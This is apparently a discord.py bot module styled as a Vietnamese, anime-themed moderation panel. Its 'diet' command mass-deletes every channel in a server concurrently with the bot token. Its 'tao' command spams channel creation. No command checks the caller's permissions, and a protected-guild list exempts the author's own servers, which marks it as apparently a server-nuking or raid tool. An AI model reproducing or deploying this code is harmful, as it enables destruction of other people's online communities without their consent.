import discord
from discord.ext import commands
import asyncio
import aiohttp

from rate_utils import (
    PROTECTED_GUILD_IDS,
    delete_channel_via_api,
    discord_action_with_retry,
)

class QuanLySystem(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.delete_semaphore = asyncio.BoundedSemaphore(4)

    # --- Lệnh hiện bảng menu Quản Lý ---
    @commands.command(name="quanly")
    async def _quan_ly_panel(self, ctx):
        """Menu quan ly"""
        p = self.bot.command_prefix
        lines = [
            f"\033[1;35m👥 THANH VIEN\033[0m",
            f"  {p}tram [user]       \033[1;30mKick\033[0m",
            f"  {p}phong [user]      \033[1;30mBan\033[0m",
            f"  {p}giai [user_id]    \033[1;30mUnban\033[0m",
            "",
            f"\033[1;34m🏗️ KENH\033[0m",
            f"  {p}diet             \033[1;30mXoa toan bo kenh\033[0m",
            f"  {p}tao [ten]        \033[1;30mTao kenh\033[0m",
            f"  {p}danh [ten]       \033[1;30mDoi ten server\033[0m",
        ]
        w = 46
        border = "═" * w
        menu = f"```ansi\n"
        menu += f"\033[1;35m╔{border}╗\033[0m\n"
        menu += f"\033[1;35m║\033[0m \033[1;37m{'QUAN LY LANG DIA':^{w-2}}\033[0m \033[1;35m║\033[0m\n"
        menu += f"\033[1;35m╠{border}╣\033[0m\n"
        for line in lines:
            menu += f"\033[1;35m║\033[0m {line:<{w-2}} \033[1;35m║\033[0m\n"
        menu += f"\033[1;35m╚{border}╝\033[0m\n"
        menu += "```"
        await ctx.send(menu)

    # --- Thực thi: Quản Lý Thành Viên (Tên lệnh JJK) ---

    @commands.command(name="tram") # Kick
    async def _kick(self, ctx, member: discord.Member, *, reason="Bị trảm khỏi kết giới"):
        try:
            await member.kick(reason=reason)
            await ctx.send(f"⚔️ **TRẢM!** Đã trục xuất: **{member.name}**", delete_after=3)
        except: await ctx.send("❌ Thiếu chú lực (Quyền) để Trảm!", delete_after=3)

    @commands.command(name="phong") # Ban
    async def _ban(self, ctx, member: discord.Member, *, reason="Phong ấn vĩnh viễn"):
        try:
            await member.ban(reason=reason)
            await ctx.send(f"🚫 **PHONG ẤN!** {member.name} đã vào Ngục Môn Cương", delete_after=3)
        except: await ctx.send("❌ Thiếu chú lực để Phong Ấn!", delete_after=3)

    @commands.command(name="giai") # Unban
    async def _unban(self, ctx, *, member_id: int):
        try:
            user = await self.bot.fetch_user(member_id)
            await ctx.guild.unban(user)
            await ctx.send(f"➕ **GIẢI ẤN!** Đã thả tự do cho: **{user.name}**", delete_after=3)
        except: await ctx.send("❌ Ấn chú không tồn tại!", delete_after=3)

    # --- Thực thi: Quản Lý Kênh & Server (Tên lệnh JJK) ---

    @commands.command(name="diet") # Clear Channels
    async def _clear_channels(self, ctx):
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Kết giới đang được bảo vệ!**", delete_after=3)
        await ctx.send("🧹 **TẨY UẾ!** Đang quét sạch toàn bộ kênh...", delete_after=3)
        token = self.bot.http.token
        async with aiohttp.ClientSession() as session:
            tasks = [
                delete_channel_via_api(session, ch.id, token, self.delete_semaphore)
                for ch in ctx.guild.channels
            ]
            await asyncio.gather(*tasks)

    @commands.command(name="tao") # Create Channels
    async def _create_channels(self, ctx, name="lanh-dia-vo-han"):
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Kết giới đang được bảo vệ!**", delete_after=3)
        await ctx.send(f"🏗️ **KIẾN TẠO!** Đang mở rộng kết giới...", delete_after=3)
        for i in range(15):
            try:
                await discord_action_with_retry(ctx.guild.create_text_channel, name=name)
            except Exception:
                break

    @commands.command(name="danh") # Rename Server
    async def _rename_server(self, ctx, *, new_name):
        try:
            await ctx.guild.edit(name=new_name)
            await ctx.send(f"📝 **ĐỔI DANH TÍNH!** Server giờ là: **{new_name}**", delete_after=3)
        except: await ctx.send("❌ Không đủ chú thuật để đổi tên!", delete_after=3)

async def setup(bot):
    await bot.add_cog(QuanLySystem(bot))